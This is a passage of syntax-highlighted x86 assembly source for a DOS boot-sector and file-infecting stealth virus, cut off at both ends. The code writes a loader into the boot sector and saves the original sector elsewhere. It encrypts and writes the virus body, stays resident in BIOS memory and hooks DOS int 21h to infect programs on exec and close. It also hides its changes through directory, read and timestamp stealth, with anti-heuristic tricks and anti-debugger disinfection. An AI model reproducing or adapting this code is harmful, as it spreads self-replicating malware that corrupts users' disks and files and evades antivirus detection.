        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">load_dh</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc1">;Use floppy root directory for old boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">000Eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
</span><span class="sc1">;Write original boot sector </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit13h_inf</span><span class="sc0">
</span><span class="sc5">ok_original</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Move virus loader into boot sector</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boot_code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">boot_size</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">write_boot</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Reset disk controler</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;************old13h]</span><span class="sc0">
</span><span class="sc1">;Write loader</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;+++++++++++old13h]</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_loader</span><span class="sc0">
</span><span class="sc5">exit13h_inf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">ok_loader</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Set boot flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">prog_type</span><span class="sc4">],</span><span class="sc3">"B"</span><span class="sc0">
</span><span class="sc1">;Perform encryption</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_encrypt</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc1">;Write virus body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">load_cx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">load_dh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0300h</span><span class="sc4">+</span><span class="sc5">sector_size</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;+++++++++++++old13h]        </span><span class="sc0">
</span><span class="sc1">;Hide changes made to boot sector</span><span class="sc0">
</span><span class="sc5">stealth_boot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Code inserted into boot sector</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">boot_code</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc1">;Allocate some BIOS memory</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0413h</span><span class="sc4">],(</span><span class="sc5">lenvir</span><span class="sc4">/</span><span class="sc2">512</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0413h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Calculate residence address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Reset disk</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc1">;Get position in disk</span><span class="sc0">
</span><span class="sc1">;mov cx,XXXXh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc0">
</span><span class="sc5">load_cx</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc1">;mov dh,XXh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc0">
</span><span class="sc5">load_dh</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">;Prepare for reading virus body</span><span class="sc0">
</span><span class="sc5">try_again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc4">+</span><span class="sc5">sector_size</span><span class="sc0">
</span><span class="sc1">;Read at es:bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Read virus body into allocated memory        </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">error_init</span><span class="sc0">
</span><span class="sc1">;Continue execution on virus body        </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc1">;Error during virus initialization</span><span class="sc0">
</span><span class="sc5">error_init</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Infection marker</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">boot_marker</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CR"</span><span class="sc0">
</span><span class="sc1">;End of boot code</span><span class="sc0">
</span><span class="sc5">boot_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Virus int 21h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">my_int21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Set int 21h running switch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">],</span><span class="sc3">"F"</span><span class="sc0">
</span><span class="sc1">;Anti-heuristic function number examination</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Save old int 24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Hook int 24h to a do-nothing handler</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
</span><span class="sc1">;Save old int 03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old03h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old03h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Hook int 03h to original int 21h</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old21h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
</span><span class="sc1">;Check for special files</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0"> </span><span class="sc1">;62h?</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0008h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_sw</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">;Check if arj is running        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"RA"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disable_stealth</span><span class="sc0">
</span><span class="sc1">;Check for pkzip utils        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"KP"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disable_stealth</span><span class="sc0">
</span><span class="sc1">;Check for lha</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"HL"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disable_stealth</span><span class="sc0">
</span><span class="sc1">;Check for backup        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"AB"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disable_stealth</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_running</span><span class="sc0">
</span><span class="sc5">disable_stealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_sw</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">no_running</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore and re-save all regs        </span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Put function number into bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Infection functions</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">infection_00</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Exec function</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">4B00h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infection_01</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_exec</span><span class="sc0">
</span><span class="sc5">infection_01</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Close file (Handle)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">3Eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_dos</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_close</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Stealth functions</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">stealth_dos</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check if stealth is disabled</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_sw</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc1">;Open file (Handle)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_00</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_open</span><span class="sc0">
</span><span class="sc5">stealth_00</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Extended open</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">6Ch</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_01</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_open</span><span class="sc0">
</span><span class="sc5">stealth_01</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Directory stealth works with function Findfirst (fcb)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_02</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_fcb</span><span class="sc0">
</span><span class="sc5">stealth_02</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Directory stealth works also with function Findnext(fcb)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_03</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_fcb</span><span class="sc0">
</span><span class="sc5">stealth_03</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Search stealth works with Findfirst (handle)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">4Eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_04</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_handle</span><span class="sc0">
</span><span class="sc5">stealth_04</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Search stealth works also with Findnext (handle)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">4Fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_05</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_handle</span><span class="sc0">
</span><span class="sc5">stealth_05</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Read stealth</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">3Fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_06</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_read</span><span class="sc0">
</span><span class="sc5">stealth_06</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Disinfect if debuggers exec</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">4B01h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_07</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_load_exec</span><span class="sc0">
</span><span class="sc5">stealth_07</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Disinfect if file write</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_08</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_write</span><span class="sc0">
</span><span class="sc5">stealth_08</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Get file date/time        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">5700h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_09</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_get_time</span><span class="sc0">
</span><span class="sc5">stealth_09</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Set file date/time        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">5701h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_set_time</span><span class="sc0">
</span><span class="sc1">;Get control back to dos</span><span class="sc0">
</span><span class="sc5">m21h_exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Free int 03h and int 24h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old21h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Directory stealth with functions 11h and 12h (fcb)</span><span class="sc0">
